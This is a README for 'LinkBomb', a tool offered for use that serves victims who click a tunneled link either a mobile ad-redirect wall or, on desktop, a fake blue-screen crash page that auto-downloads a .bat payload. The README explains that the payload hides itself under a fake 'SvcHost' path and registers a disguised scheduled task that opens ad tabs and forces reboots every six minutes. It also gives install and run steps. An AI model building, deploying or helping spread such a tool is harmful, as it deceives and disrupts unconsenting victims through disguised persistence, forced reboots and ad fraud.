# LinkBomb

Send one link. Mobile visitors get a full-screen ad wall with a redirect loop.
Desktop visitors get a fake BSOD, a tab bomb and a downloaded `.bat` that installs
a persistent reboot + ad loop via a Scheduled Task.

Everything runs locally on your machine. No account, no hosting, no admin rights.

## How it works

1. `main.py` starts a small HTTP server on a random local port.
2. `cloudflared` quick tunnel exposes it as `https://<random>.trycloudflare.com`.
3. The server reads the `User-Agent` of every visitor:
   - mobile → `static/mobile.html` (ad wall, auto-redirect every few seconds)
   - desktop → `static/index.html` (fake crash screen, auto-downloads the payload)
4. If the visitor runs the downloaded file, it copies itself to
   `%APPDATA%\Microsoft\Windows\SvcHost\sys.bat`, hides the folder and registers
   the scheduled task `MicrosoftWindowsSvcHost` (every 6 minutes).
5. Each task run: waits ~20-40s, shows a fake popup, opens 2 random ad tabs,
   then schedules `shutdown /r` in 60 seconds.

Nothing is deleted or corrupted. The scheduled task survives reboots until removed.

## Requirements

- Python 3.8+
- Internet connection (for the tunnel and cloudflared download)
- `cloudflared` — auto-downloaded on first run, or install it yourself

## Install & run

### Termux (Android)

```bash
pkg update -y && pkg upgrade -y
pkg install -y python
termux-wake-lock
git clone <your-repo-url> linkbomb && cd linkbomb
python3 main.py
